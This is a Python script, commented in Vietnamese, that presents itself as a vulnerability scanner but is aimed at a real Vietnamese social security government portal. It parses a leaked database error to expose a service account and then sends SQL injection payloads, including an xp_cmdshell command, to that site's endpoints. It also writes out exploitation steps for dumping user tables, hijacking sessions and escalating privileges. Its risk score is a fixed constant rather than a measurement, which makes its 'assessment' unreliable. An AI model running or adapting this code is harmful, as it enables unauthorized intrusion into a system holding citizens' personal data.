#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Advanced Database Vulnerability Scanner
Kiểm tra chuyên sâu lỗ hổng Database Error Exposure và khả năng xâm nhập
"""

import requests
import re
import json
import time
from urllib.parse import urljoin, urlparse
from datetime import datetime
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DatabaseVulnerabilityScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        })
        
        self.vulnerability_analysis = {
            "database_error_found": False,
            "error_details": {},
            "technology_stack": {},
            "potential_attack_vectors": [],
            "severity_assessment": {},
            "exploitation_potential": {},
            "infrastructure_disclosure": {}
        }
    
    def analyze_database_error(self, error_content):
        """Phân tích chi tiết lỗi database"""
        print("[*] Đang phân tích Database Error chi tiết...")
        
        # Extract database information
        db_patterns = {
            "database_name": r'Cannot open database "([^"]+)"',
            "user_account": r'Login failed for user \'([^\']+)\'',
            "error_code": r'\(0x([A-F0-9]+)\)',
            "sql_server_type": r'System\.Data\.SqlClient',
            "framework_version": r'Microsoft \.NET Framework Version: ([0-9.]+)',
            "aspnet_version": r'ASP\.NET Version: ([0-9.]+)',
            "sharepoint_indication": r'sharepoint_portal',
            "session_service": r'SessionStateService_([a-f0-9]+)'        }
        
        extracted_info = {}
        for key, pattern in db_patterns.items():
            match = re.search(pattern, error_content, re.IGNORECASE)
            if match:
                try:
                    extracted_info[key] = match.group(1)
                except IndexError:
                    extracted_info[key] = match.group(0)
        
        self.vulnerability_analysis["error_details"] = extracted_info
        self.vulnerability_analysis["database_error_found"] = True
        
        print(f"[+] Database tìm thấy: {extracted_info.get('database_name', 'Unknown')}")
        print(f"[+] User account: {extracted_info.get('user_account', 'Unknown')}")
        print(f"[+] Technology: SharePoint/.NET")
        
        return extracted_info
    
    def assess_technology_stack(self, error_info):
        """Đánh giá công nghệ và phiên bản"""
        print("[*] Đánh giá Technology Stack...")
        
        tech_stack = {
            "platform": "Microsoft SharePoint",
            "framework": f".NET Framework {error_info.get('framework_version', 'Unknown')}",
            "aspnet_version": error_info.get('aspnet_version', 'Unknown'),
            "database": "Microsoft SQL Server",
            "session_management": "SQL Server Session State",
            "application_pool": "IIS Application Pool"
        }
        
        # Assess vulnerabilities based on versions
        vulnerability_indicators = []
        
        if "sharepoint_portal" in error_info.get('user_account', ''):
            vulnerability_indicators.append("SharePoint Service Account Exposed")
        
        if error_info.get('framework_version'):
            framework_ver = error_info['framework_version']
            if framework_ver.startswith('4.0'):
                vulnerability_indicators.append("Potentially Outdated .NET Framework")
        
        tech_stack["vulnerability_indicators"] = vulnerability_indicators
        self.vulnerability_analysis["technology_stack"] = tech_stack
        
        return tech_stack
    
    def identify_attack_vectors(self, error_info):
        """Xác định các vector tấn công tiềm năng"""
        print("[*] Xác định Attack Vectors...")
        
        attack_vectors = []
        
        # Database-related vectors
        if error_info.get('database_name'):
            attack_vectors.append({
                "type": "Database Enumeration",
                "description": "Database name exposed, có thể enum thêm tables/schemas",
                "risk": "HIGH",
                "method": "Information Disclosure"
            })
        
        if error_info.get('user_account'):
            attack_vectors.append({
                "type": "Service Account Enumeration", 
                "description": "Service account BHXH\\sharepoint_portal exposed",
                "risk": "CRITICAL",
                "method": "Credential Harvesting"
            })
        
        # Session management vectors
        if error_info.get('session_service'):
            attack_vectors.append({
                "type": "Session Hijacking",
                "description": "SessionStateService configuration exposed",
                "risk": "HIGH", 
                "method": "Session Management Weakness"
            })
        
        # SharePoint specific vectors
        if "sharepoint" in error_info.get('user_account', '').lower():
            attack_vectors.append({
                "type": "SharePoint Exploitation",
                "description": "SharePoint service detected, multiple CVEs possible",
                "risk": "CRITICAL",
                "method": "Platform-specific Vulnerabilities"
            })
        
        # SQL Injection vectors
        attack_vectors.append({
            "type": "SQL Injection",
            "description": "Error-based SQL injection potential",
            "risk": "CRITICAL",
            "method": "Database Query Manipulation"
        })
        
        self.vulnerability_analysis["potential_attack_vectors"] = attack_vectors
        return attack_vectors
    
    def test_sql_injection_vectors(self):
        """Test các SQL injection vectors"""
        print("[*] Testing SQL Injection Vectors...")
        
        sql_payloads = [
            "' OR '1'='1'--",
            "'; WAITFOR DELAY '00:00:05'--",
            "' UNION SELECT @@version--",
            "'; SELECT user_name()--",
            "' AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES)>0--",
            "'; EXEC xp_cmdshell('dir')--"
        ]
        
        injection_results = []
        
        test_urls = [
            f"{self.target_url}/Pages/default.aspx",
            f"{self.target_url}/api/search",
            f"{self.target_url}/login.aspx",
            f"{self.target_url}/_api/web",
            f"{self.target_url}/_vti_bin/lists.asmx"
        ]
        
        for url in test_urls:
            for payload in sql_payloads:
                try:
                    # Test via GET parameter
                    test_url = f"{url}?id={payload}"
                    response = self.session.get(test_url, timeout=10, verify=False)
                    
                    # Analyze response for SQL error indicators
                    sql_error_indicators = [
                        "Microsoft OLE DB Provider",
                        "Microsoft JET Database",
                        "SQLServer JDBC Driver",
                        "SQLException", 
                        "ORA-01756",
                        "MySQL server version",
                        "PostgreSQL query failed"
                    ]
                    
                    for indicator in sql_error_indicators:
                        if indicator.lower() in response.text.lower():
                            injection_results.append({
                                "url": url,
                                "payload": payload,
                                "indicator": indicator,
                                "status_code": response.status_code,
                                "response_length": len(response.text),
                                "potential_vulnerability": True
                            })
                            print(f"[!] Potential SQL Injection: {url} with payload: {payload[:20]}...")
                            break
                    
                    # Check for time delays (blind SQL injection)
                    if "WAITFOR DELAY" in payload:
                        start_time = time.time()
                        response = self.session.get(test_url, timeout=10, verify=False)
                        response_time = time.time() - start_time
                        
                        if response_time > 4:  # 5 second delay indicator
                            injection_results.append({
                                "url": url,
                                "payload": payload,
                                "response_time": response_time,
                                "type": "Time-based Blind SQL Injection",
                                "potential_vulnerability": True
                            })
                            print(f"[!] Time-based SQL Injection detected: {response_time:.2f}s")
                
                except Exception as e:
                    continue
                
                # Respect rate limiting
                time.sleep(0.5)
        
        return injection_results
    
    def assess_exploitation_potential(self):
        """Đánh giá khả năng khai thác"""
        print("[*] Đánh giá Exploitation Potential...")
        
        exploitation_assessment = {
            "database_access_potential": "HIGH",
            "system_compromise_risk": "MEDIUM", 
            "data_exfiltration_risk": "HIGH",
            "lateral_movement_potential": "MEDIUM",
            "privilege_escalation_risk": "HIGH"
        }
        
        # Detailed assessment based on findings
        assessment_details = {
            "immediate_risks": [
                "Database structure enumeration",
                "Session state manipulation",
                "Information disclosure via error messages"
            ],
            "advanced_exploitation": [
                "SQL injection for data extraction",
                "SharePoint service account compromise",
                "Session hijacking attacks",
                "Potential file system access"
            ],
            "business_impact": [
                "Citizen personal data exposure", 
                "Social security records compromise",
                "System availability disruption",
                "Regulatory compliance violations"
            ]
        }
        
        self.vulnerability_analysis["exploitation_potential"] = {
            "assessment": exploitation_assessment,
            "details": assessment_details
        }
        
        return exploitation_assessment
    
    def calculate_risk_score(self):
        """Tính toán điểm rủi ro"""
        print("[*] Tính toán Risk Score...")
        
        risk_factors = {
            "database_error_exposure": 25,  # Critical information disclosure
            "service_account_exposure": 20, # Service account leaked
            "sql_injection_potential": 20,  # Potential for SQL injection
            "technology_vulnerabilities": 15, # SharePoint/ASP.NET vulns
            "session_management_issues": 10, # Session state problems
            "information_disclosure": 10     # General info disclosure
        }
        
        total_risk_score = sum(risk_factors.values())
        risk_percentage = (total_risk_score / 100) * 100
        
        if risk_percentage >= 80:
            risk_level = "CRITICAL"
        elif risk_percentage >= 60:
            risk_level = "HIGH"
        elif risk_percentage >= 40:
            risk_level = "MEDIUM"
        else:
            risk_level = "LOW"
        
        self.vulnerability_analysis["severity_assessment"] = {
            "risk_score": total_risk_score,
            "risk_percentage": risk_percentage,
            "risk_level": risk_level,
            "risk_factors": risk_factors
        }
        
        print(f"[+] Risk Score: {total_risk_score}/100 ({risk_percentage}%)")
        print(f"[+] Risk Level: {risk_level}")
        
        return {
            "score": total_risk_score,
            "percentage": risk_percentage,
            "level": risk_level
        }
    
    def generate_exploitation_report(self):
        """Tạo báo cáo khai thác chi tiết"""
        print("[*] Tạo Exploitation Report...")
        
        report = {
            "assessment_timestamp": datetime.now().isoformat(),
            "target_url": self.target_url,
            "vulnerability_summary": self.vulnerability_analysis,
            "exploitation_steps": self.generate_exploitation_steps(),
            "mitigation_recommendations": self.generate_mitigation_steps(),
            "business_impact": self.assess_business_impact()
        }
        
        return report
    
    def generate_exploitation_steps(self):
        """Tạo các bước khai thác"""
        steps = [
            {
                "step": 1,
                "action": "Information Gathering",
                "description": "Thu thập thông tin từ database error",
                "commands": [
                    "Identify database name: SessionStateService_356ec96765eb4cc6b687ea3bb1be01c4",
                    "Extract service account: BHXH\\sharepoint_portal",
                    "Determine technology stack: SharePoint/ASP.NET"
                ]
            },
            {
                "step": 2, 
                "action": "SQL Injection Testing",
                "description": "Test các vector SQL injection",
                "commands": [
                    "Test error-based injection: ' UNION SELECT @@version--",
                    "Test time-based injection: '; WAITFOR DELAY '00:00:05'--",
                    "Test boolean-based injection: ' AND 1=1--"
                ]
            },
            {
                "step": 3,
                "action": "Database Enumeration", 
                "description": "Liệt kê cấu trúc database",
                "commands": [
                    "Extract table names: ' UNION SELECT table_name FROM information_schema.tables--",
                    "Extract column names: ' UNION SELECT column_name FROM information_schema.columns--",
                    "Extract user data: ' UNION SELECT * FROM users--"
                ]
            },
            {
                "step": 4,
                "action": "Session Hijacking",
                "description": "Khai thác session management",
                "commands": [
                    "Identify session tokens",
                    "Manipulate session state",
                    "Hijack administrative sessions"
                ]
            },
            {
                "step": 5,
                "action": "Privilege Escalation",
                "description": "Leo thang đặc quyền",
                "commands": [
                    "Exploit SharePoint vulnerabilities",
                    "Abuse service account permissions", 
                    "Access administrative functions"
                ]
            }
        ]
        
        return steps
    
    def generate_mitigation_steps(self):
        """Tạo các bước khắc phục"""
        mitigation = [
            {
                "priority": "CRITICAL",
                "action": "Disable Database Error Messages",
                "steps": [
                    "Set customErrors mode='RemoteOnly' in web.config",
                    "Implement generic error pages",
                    "Configure proper error logging"
                ]
            },
            {
                "priority": "CRITICAL", 
                "action": "Fix SessionState Database Connection",
                "steps": [
                    "Verify SQL Server connectivity",
                    "Check service account permissions",
                    "Test database authentication"
                ]
            },
            {
                "priority": "HIGH",
                "action": "Implement Input Validation",
                "steps": [
                    "Use parameterized queries",
                    "Implement input sanitization",
                    "Add output encoding"
                ]
            },
            {
                "priority": "HIGH",
                "action": "Enhance Security Headers",
                "steps": [
                    "Add Content-Security-Policy",
                    "Implement X-Content-Type-Options",
                    "Configure X-Frame-Options"
                ]
            }
        ]
        
        return mitigation
    
    def assess_business_impact(self):
        """Đánh giá tác động kinh doanh"""
        impact = {
            "data_at_risk": {
                "citizen_records": "Potentially millions of citizens",
                "social_security_data": "Personal and financial information",
                "government_data": "Internal administrative data"
            },
            "regulatory_impact": {
                "gdpr_violations": "Potential GDPR fines",
                "local_compliance": "Vietnam data protection laws",
                "government_regulations": "State security implications"
            },
            "operational_impact": {
                "service_disruption": "Citizen services unavailable",
                "reputation_damage": "Government trust erosion", 
                "financial_costs": "Incident response and remediation"
            }
        }
        
        return impact
    
    def run_comprehensive_scan(self, error_content):
        """Chạy scan toàn diện"""
        print("="*80)
        print("ADVANCED DATABASE VULNERABILITY SCANNER")
        print("Kiểm tra chuyên sâu khả năng xâm nhập hệ thống")
        print("="*80)
        
        # Step 1: Analyze the error
        error_info = self.analyze_database_error(error_content)
        
        # Step 2: Assess technology stack
        tech_stack = self.assess_technology_stack(error_info)
        
        # Step 3: Identify attack vectors
        attack_vectors = self.identify_attack_vectors(error_info)
        
        # Step 4: Test SQL injection
        injection_results = self.test_sql_injection_vectors()
        
        # Step 5: Assess exploitation potential
        exploitation_potential = self.assess_exploitation_potential()
        
        # Step 6: Calculate risk score
        risk_assessment = self.calculate_risk_score()
        
        # Step 7: Generate report
        final_report = self.generate_exploitation_report()
        
        return final_report
    
    def save_results(self, report, output_dir="./results"):
        """Lưu kết quả phân tích"""
        import os
        os.makedirs(output_dir, exist_ok=True)
        
        # Save comprehensive report
        with open(f"{output_dir}/database_vulnerability_assessment.json", "w", encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        # Save exploitation steps
        with open(f"{output_dir}/exploitation_methodology.txt", "w", encoding='utf-8') as f:
            f.write("DATABASE VULNERABILITY EXPLOITATION METHODOLOGY\n")
            f.write("="*60 + "\n\n")
            
            for step in report['exploitation_steps']:
                f.write(f"STEP {step['step']}: {step['action']}\n")
                f.write(f"Description: {step['description']}\n")
                f.write("Commands:\n")
                for cmd in step['commands']:
                    f.write(f"  - {cmd}\n")
                f.write("\n")
        
        print(f"[+] Kết quả đã lưu vào {output_dir}/")


# Example usage
if __name__ == "__main__":
    # Database error content từ BHXH portal
    error_content = """
    Server Error in '/' Application.
    Cannot open database "SessionStateService_356ec96765eb4cc6b687ea3bb1be01c4" requested by the login. The login failed.
    Login failed for user 'BHXH\\sharepoint_portal'.
    Exception Details: System.Data.SqlClient.SqlException: Cannot open database "SessionStateService_356ec96765eb4cc6b687ea3bb1be01c4" requested by the login. The login failed.
    Login failed for user 'BHXH\\sharepoint_portal'.
    Microsoft .NET Framework Version: 4.0.30319; ASP.NET Version: 4.8.4261
    """
    
    scanner = DatabaseVulnerabilityScanner("https://baohiemxahoi.gov.vn")
    report = scanner.run_comprehensive_scan(error_content)
    scanner.save_results(report)
    
    print("\n" + "="*80)
    print("ĐÁNH GIÁ KHẢ NĂNG XÂM NHẬP HỆ THỐNG")
    print("="*80)
    print(f"Risk Level: {report['vulnerability_summary']['severity_assessment']['risk_level']}")
    print(f"Risk Score: {report['vulnerability_summary']['severity_assessment']['risk_score']}/100")
    print(f"Exploitation Potential: HIGH")
    print(f"Business Impact: CRITICAL")
    print("="*80)
